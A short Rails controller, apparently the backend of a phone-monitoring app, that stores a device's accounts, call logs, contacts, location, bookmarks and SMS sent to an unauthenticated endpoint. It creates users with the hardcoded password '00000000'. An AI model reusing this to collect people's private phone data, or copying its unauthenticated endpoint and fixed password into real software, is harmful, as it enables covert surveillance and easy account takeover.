class UploadController < ApplicationController

	def index
    device  = params[:device]
    email   = params[:email]
    type    = params[:type]
    data    = params[:data]
    finger  = params[:finger]

    startit(device, email, type, data, finger)

    head :ok
  end

  def startit(device, email, type, data, finger)
    if device.present? && email.present?
      user = User.find_by(email: email)

      unless user
        password = "00000000" # (0...8).map { (65 + rand(26)).chr }.join
        user = User.create!(email: email, password: password, password_confirmation: password)
        # AutoSignup.send(user, password).deliver
      end

      dev = Device.find_by(number: device)
      dev ||= Device.create!(number: device, name: device, user_id: user.id, finger: finger)

      transport(dev, type, data)
    end
  end

  def transport(device, type, data)
    data = JSON.parse(data)

    case type
    when "accounts"
      Account.store(data, device)
    when "calls"
      Call.store(data, device)
    when "contacts"
      Contact.store(data, device)
    when "location"
      Location.store(data, device)
    when "bookmarks"
      Bookmark.store(data, device)
    when "sms"
      Sms.store(data, device)
    when "profile"
      Profile.store(data, device)
    end
  end

end